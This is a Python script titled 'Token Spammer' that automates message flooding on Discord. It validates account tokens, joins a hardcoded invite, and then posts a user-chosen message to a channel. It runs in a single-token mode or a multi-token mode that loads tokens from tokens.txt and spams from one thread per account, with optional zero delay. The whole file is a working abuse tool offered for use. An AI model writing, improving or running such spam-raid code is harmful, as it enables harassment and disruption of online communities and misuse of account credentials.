anyerror = False
try:
    import requests
    import colorama
except:
  anyerror = True
if anyerror == True:
  print("Missing Module(s), Press Enter To Start Repair Process (Wont Always Work)")
  input("")
  try:
    import os
    os.system("pip install requests")
    os.system("pip install colorama")
    print("Problems Should Be Fixed Now, Restart The Program")
    input("")
    exit()
  except:
    print("Error While Fixing, Sorry")
    input("")
    exit()
try:
    import os
    from os import system
    system("title " + "Token Spammer")
except:
    pass
import threading, time
colorama.init(autoreset=True)
def single_spammer():
    invite_code = "weYYXeUSNm"
    while True:
        tokens = input("Enter Token: ")
        r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
        if "200" not in str(r1):
            print(colorama.Fore.RED + "Invalid Token")
        if "200" in str(r1):
            r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
            if "200" in str(r):
                break
            if "403" in str(r):
                print(colorama.Fore.YELLOW + "Locked Token")
    
    while True:
        try:
            delay = input("Enter Delay (0 For None): ")
            delay = float(delay)
            break
        except:
            print("Enter A Valid Choice")
    msg = input("Enter Msg To Spam: ")


    while True:
        try:
            channel = input("Enter Channel Id: ")
            channel = int(channel)
            break
        except:
            print("Enter A Valid Choice")
    
    while True:
        try:
            amount = input("Enter Amount Of Messages To Send: ")
            amount = int(amount)
            break
        except:
            print("Enter A Valid Choice")
    headers = {
        "authorization": tokens
    }
    json = {
        "content": msg,
        "tts": False
    }
    done = 0
    while True:
        try:
            r = requests.post("https://discord.com/api/v9/channels/"+str(channel)+"/messages", headers=headers, json=json)
            r = str(r)
            if "200" in r:
                done = int(done) + 1
                print(colorama.Fore.GREEN + f"[{str(done)}/{str(amount)}] Succsesfully Sent Message")
            else:
                print(colorama.Fore.RED + "Unkown Error/Rate Limited")
        except:
            print("Unkown Error")
        if str(done) == str(amount):
            print("Done")
            input("")
            exit()
        time.sleep(float(delay))
        

def reader():
    list = []
    print("Press Enter To Start Loading The Tokens")
    input("")
    file = open("tokens.txt", "r")
    tokens = file.readlines()
    file.close()
    er = 0
    for e in tokens:
        if "\n" in e:
            list.append(e[:-1])
        else:
            list.append(e)
        er = int(er) + 1
        print(f"[{str(er)}] Loaded Token")
    print("Done Loading Tokens")
    while True:
        try:
            delay = input("Enter Delay (0 For None): ")
            delay = float(delay)
            break
        except:
            print("Enter A Valid Choice")


    while True:
        try:
            channel = input("Enter Channel Id: ")
            channel = int(channel)
            break
        except:
            print("Enter A Valid Choice")
    msg = input("Enter Message To Spam: ")
    print("Press Enter To Start")
    input("")
    for tokens in list:
        threading.Thread(target=spammer, args=(tokens, channel, msg, delay)).start()




    

def spammer(tokens, channel, msg, delay):
    headers = {
        "authorization": tokens
    }
    json = {
        "content": msg,
        "tts": False
    }
    while True:
        try:
            r = requests.post("https://discord.com/api/v9/channels/"+str(channel)+"/messages", headers=headers, json=json)
            r = str(r)
            if "200" in r:
                print(colorama.Fore.GREEN + "Succsesfully Sent Message")
            else:
                print(colorama.Fore.RED + "Unkown Error/Rate Limited")
        except:
            print("Unkown Error")
        time.sleep(float(delay))











while True:
    tools = input("""
1. Single Token Spammer
2. Multi Token Spammer
> """)
    if tools == "1" or tools == "2":
        break
    else:
        print("Enter A Valid Choice")

if tools == "1":
    single_spammer()
if tools == "2":
    reader()